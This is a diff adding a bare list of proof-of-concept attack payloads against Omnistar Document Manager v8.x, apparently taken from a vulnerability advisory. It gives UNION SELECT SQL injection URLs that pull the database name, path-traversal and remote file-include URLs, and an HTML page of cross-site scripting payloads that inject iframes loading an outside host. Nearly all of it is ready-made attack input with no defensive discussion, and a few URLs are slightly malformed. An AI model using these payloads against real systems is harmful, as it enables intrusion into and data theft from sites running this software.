@@ -1,0 +1,30 @@
+SQL-injection:
+https://www.example.com/[PATH]/index.php?area=main&interface=users&sort_by=1&sort_order=ASC&page=1&return_to=@list&act=report&id=-1' union all select 1,2,3,4,()database,6--
+https:/www.example.com/[PATH]/index.php?area=main&interface=users&sort_by=1&sort_order=ASC&page=-1%27&return_to=@list&act=list&sort_by=first_name&sort_order=-1' union all select 1,2,3,4,()database,6--
+https://www.example.com/[PATH]/index.php?area=main&interface=users&sort_by=1&sort_order=ASC&page=1&return_to=@list&act=delete&id=-1' union all select 1,2,3,4,()database,6--
+https://www.example.com/[PATH]/index.php?area=main&interface=users&sort_by=1&sort_order=ASC&page=1&return_to=@list&act=delete&id=-1' union all select 1,2,3,4,()database,6--
+https://www.example.com/[PATH]/index.php?interface=-1' union all select 1,2,3,4,()database,6--&alert_msg=1337
+https://www.example.com/[PATH]/index.php?area=main&interface=recycle_bin&act=list&sort_by=1&sort_order=ASC&page=-1' union all select 1,2,3,4,()database,6-- &return_to=-1' union all select 1,2,3,4,()database,6.
+
+Local file-include:
+
+https://www.example.com/[PATH]/index.php?area=../../[LOCAL FILE INCLUDE VULNERABILITY!]/&..
+https:// www.example.com /[PATH]/index.php?area=http://[LOCAL FILE INCLUDE VULNERABILITY!]&..
+
+Cross-site-scripting:
+
+<html>
+<head><body>
+<title>Omnistar Document Manager v8.x - Client Side Cross Site Scripting PoC</title>
+<iframe src=https://www.example.com/[PATH]/index.php?interface=folder_groups-%3E%22%3Ciframe%20src=http://vulnerability-lab.com%3E>
+<iframe src=https://www.example.com/[PATH]/index.php?area=main&interface=backup_restore-%3E%22%3Ciframe%20src=http://vulnerability-lab.com%3E>
+<iframe src=https://www.example.com/[PATH]/index.php?interface=custom&act=user_fields-%3E%22%3Ciframe%20src=http://vulnerability-lab.com%3E>
+<iframe src=https://www.example.com/[PATH]/index.php?area=main&interface=anonymous_review&act=anonymous_root-%3E%22%3Ciframe%20src=http://vulnerability-lab.com%3E>
+<iframe src=https://www.example.com/[PATH]/index.php?interface=[SQL]&alert_msg=-%3E%22%3Ciframe%20src=http://vulnerability-lab.com%3E>
+<iframe src=https://www.example.com/[PATH]/index.php?area=main&interface=documents&sort_by=1&sort_order=ASC&page=1&return_to=@list&act=x&category=-%3E%22%3Ciframe%20src=http://vulnerability-lab.com%3E>
+</body></head>
+</html>
+
+
+
+
